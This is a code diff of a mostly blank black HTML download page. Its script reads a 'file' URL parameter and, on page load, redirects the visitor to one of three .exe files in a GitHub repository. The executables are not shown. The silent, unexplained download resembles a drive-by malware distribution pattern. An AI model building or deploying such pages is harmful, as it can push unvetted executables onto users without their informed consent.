@@ -2,24 +2,40 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Download</title>
+    <title>File Downloads</title>
+    <style>
+        body {
+            background: #000000;
+            margin: 0;
+            padding: 0;
+            color: white;
+            font-family: Arial, sans-serif;
+        }
+    </style>
+    <script>
+        // Get the filename from URL parameters
+        function getFileFromUrl() {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get('file');
+        }
+        
+        // Auto-download when page loads
+        window.onload = function() {
+            const file = getFileFromUrl();
+            const downloadUrls = {
+                '1': 'https://github.com/voidpardoxco/g/raw/refs/heads/master/1.exe',
+                '2': 'https://github.com/voidpardoxco/g/raw/refs/heads/master/2.exe',
+                '3': 'https://github.com/voidpardoxco/g/raw/refs/heads/master/3.exe'
+            };
+            
+            if (file && downloadUrls[file]) {
+                // Redirect to download
+                window.location.href = downloadUrls[file];
+            }
+        };
+    </script>
 </head>
 <body>
-<script>
-    // Get the filename from the URL path
-    const path = window.location.pathname;
-    const filename = path.split('/').pop();
-    
-    // Valid files
-    const validFiles = ['1.exe', '2.exe', '3.exe'];
-    
-    if (validFiles.includes(filename)) {
-        // Redirect to GitHub raw file
-        window.location.href = `https://github.com/voidpardoxco/g/raw/refs/heads/master/${filename}`;
-    } else {
-        // Show blank page for other requests
-        document.body.style.backgroundColor = '#000000';
-    }
-</script>
+    <!-- This page is intentionally mostly blank -->
 </body>
 </html>
